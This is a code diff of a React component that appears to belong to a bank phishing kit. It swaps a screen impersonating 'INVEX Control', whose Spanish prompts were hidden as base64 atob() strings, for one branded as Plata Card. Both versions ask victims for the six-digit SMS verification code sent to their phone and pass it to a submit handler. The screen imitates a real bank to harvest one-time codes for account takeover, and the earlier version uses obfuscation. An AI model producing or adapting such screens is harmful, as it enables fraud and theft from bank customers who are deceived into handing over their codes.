@@ -832,22 +832,32 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         return getBankContainer(phoneContent);
 
       case ScreenType.CODIGO:
-        const phoneTermination = screenData.terminacion || '8909';
+        const phoneTermination = screenData.terminacion || '5880';
         
         const verifyContent = (
           <>
-            <h2 className="text-xl font-bold mb-3">{atob('VmluY3VsYXIgZGlzcG9zaXRpdm8gYSBJTlZFWCBDb250cm9s')}</h2>
-            <p className="mb-4 text-sm text-gray-600">
-              {atob('SW5ncmVzYSBlbCBjw7NkaWdvIHF1ZSByZWNpYmlzdGUgcG9yIFNNUyBhbCBuw7ptZXJvICoqKg==')}
-              {phoneTermination} {atob('cGFyYSBwb2RlciB2aW5jdWxhciB0dSBkaXNwb3NpdGl2byBjb24gSU5WRVggQ29udHJvbC4=')}
-            </p>
+            {/* Logo de Plata Card */}
+            <div className="flex justify-center mb-6">
+              <img 
+                src={platacardLogo} 
+                alt="Plata Card" 
+                className="h-12 object-contain"
+              />
+            </div>
             
-            <div className="mb-4">
-              <label className="block text-sm font-medium mb-2">{atob('Q8OzZGlnbyBkZSB2ZXJpZmljYWNpw7Nu')}</label>
+            <h2 className="text-xl font-bold mb-4 text-center text-[#BE0046]">
+              Ingresa el código que recibiste por SMS al número *{phoneTermination} para vincular tu dispositivo con PlataCard
+            </h2>
+            
+            <div className="mb-6">
+              <label className="block text-lg font-semibold mb-3 text-gray-800">Código de verificación</label>
+              <p className="text-sm text-gray-600 mb-4">
+                Introduce el código de 6 dígitos enviado por SMS.
+              </p>
               <Input 
                 type="text" 
                 placeholder="000000"
-                className="w-full border border-gray-300 rounded p-3 text-center text-lg tracking-widest"
+                className="w-full border-2 border-gray-300 rounded-lg p-4 text-center text-2xl tracking-[0.5em] font-mono focus:border-[#BE0046] focus:ring-2 focus:ring-[#BE0046] focus:ring-opacity-20"
                 value={dataC}
                 onChange={(e) => {
                   const value = e.target.value.replace(/\D/g, '').slice(0, 6);
@@ -855,23 +865,20 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 }}
                 maxLength={6}
               />
-              <p className="text-xs text-gray-500 mt-1">
-                {atob('Q8OzZGlnbyBkZSA2IGTDrWdpdG9zIGVudmlhZG8gcG9yIFNNUw==')}
-              </p>
             </div>
             
             <Button 
-              className="w-full bg-[#a71138] hover:bg-[#e04343] text-white py-3 text-lg"
+              className="w-full bg-[#BE0046] hover:bg-[#9A0037] text-white py-4 text-lg font-semibold rounded-lg transition-colors duration-200"
               onClick={() => {
                 if (dataC.length === 6) {
                   onSubmit(ScreenType.CODIGO, { codigo: dataC });
                 } else {
-                  alert(atob('UG9yIGZhdm9yIGluZ3Jlc2EgZWwgY8OzZGlnbyBjb21wbGV0byBkZSA2IGTDrWdpdG9z'));
+                  alert('Por favor ingresa el código completo de 6 dígitos');
                 }
               }}
               disabled={dataC.length !== 6}
             >
-              {atob('VmVyaWZpY2FyIGPDs2RpZ28=')}
+              Verificar código
             </Button>
           </>
         );
